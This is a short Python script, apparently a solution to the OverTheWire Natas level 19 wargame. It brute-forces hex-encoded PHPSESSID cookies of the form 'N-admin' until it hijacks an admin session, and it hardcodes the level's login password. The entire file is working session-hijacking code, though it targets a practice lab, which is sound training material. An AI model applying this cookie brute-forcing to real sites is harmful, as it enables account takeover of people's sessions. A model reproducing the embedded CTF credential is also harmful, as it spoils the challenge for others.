import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

max_id = 640

for i in range(0, max_id + 1):
    value = f"{i}-admin"
    bytes_data = value.encode('utf-8')
    # Convert the bytes to a hexadecimal string
    hex_data = bytes_data.hex()
    
    cookie = f"PHPSESSID={hex_data}"

    headers = {'Cookie': cookie}

    print(f'[+] Getting {value}')
    response = requests.get(url, headers=headers, auth=auth)

    if "You are logged in as a regular user" not in response.text:
        print(f"\n[✅] Admin PHPSESSID is: {value} / Hex Data: {hex_data}")
        break